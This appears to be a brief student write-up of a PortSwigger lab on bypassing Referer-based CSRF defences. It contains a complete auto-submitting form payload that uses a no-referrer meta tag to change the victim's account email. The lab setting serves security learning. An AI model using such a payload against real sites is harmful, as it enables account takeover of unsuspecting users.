# [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

> server can deny the http request if the `referer` header is incorrect, but some cases the server falls back to a state where if there is no `referer` header in the request then it accepts the request

- in the exploit a `<meta>` tag will overwrite the requirement to add the `referer` header to the request

`<meta name="referrer" content="no-referrer">`

> since there is no `csrf` key the request should work with a `<meta>` tag that make skips the `referer` header in the request

```
<meta name="referrer" content="no-referrer" />
<form method="POST" action="https://xxx.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="duck@quack" />
</form>
<script>
  document.forms[0].submit();
</script>
```
